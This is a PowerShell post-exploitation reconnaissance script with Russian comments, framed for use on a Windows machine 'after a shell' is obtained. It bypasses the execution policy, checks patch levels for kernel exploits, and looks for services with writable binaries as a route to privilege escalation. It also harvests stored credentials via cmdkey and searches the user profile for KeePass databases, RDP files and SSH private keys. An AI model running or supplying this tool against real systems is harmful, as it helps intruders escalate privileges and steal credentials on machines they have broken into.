# win-quick.ps1 — быстрая разведка Windows после шелла (PowerShell, без прав админа работает тоже)
# юзаж: powershell -ep bypass -f win-quick.ps1  (или копипастой по секциям)

function Section($n){ "`n===== $n =====" }

Section "USER / PRIVS"; whoami; whoami /priv; whoami /groups | Select-Object -First 15

Section "ВЕРСИЯ И ПАТЧИ (ищи kernel-exploit)"; [System.Environment]::OSVersion.Version; Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5

Section "СЕРВИСЫ ОТ SYSTEM / НЕСТАНДАРТНЫЕ ПУТИ"
Get-CimInstance win32_service | Where-Object { $_.PathName -and $_.PathName -notmatch '^(\\?\")?C:\\Windows' } |
  Select-Object Name, StartName, PathName | Format-List

Section "АВТОЗАГРУЗКА"; Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' |
  Select-Object * | Format-List

Section "АНПРОТЕКТЕД СЕРВИСЫ (модифицируемые бинарники)"
Get-CimInstance win32_service | ForEach-Object {
  $p = $_.PathName -replace '^"|"$','' -replace ' .*$',''
  if ($p -and (Test-Path $p)) {
    $acl = Get-Acl $p
    if ($acl.AccessToString -match 'Everyone|Users.*(Full|Modify|Write)') { "$($_.Name): $p" }
  }
}

Section "АЛЬТЕРНАТИВНЫЕ КРЕДЫ"
cmdkey /list
Get-ChildItem $env:USERPROFILE -Recurse -Include *.kdbx,*.rdp,id_rsa -ErrorAction SilentlyContinue | Select-Object -First 10 FullName

Section "СЕАНСЫ / ДОМАЕН"; qwinsta 2>$null; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 2>$null
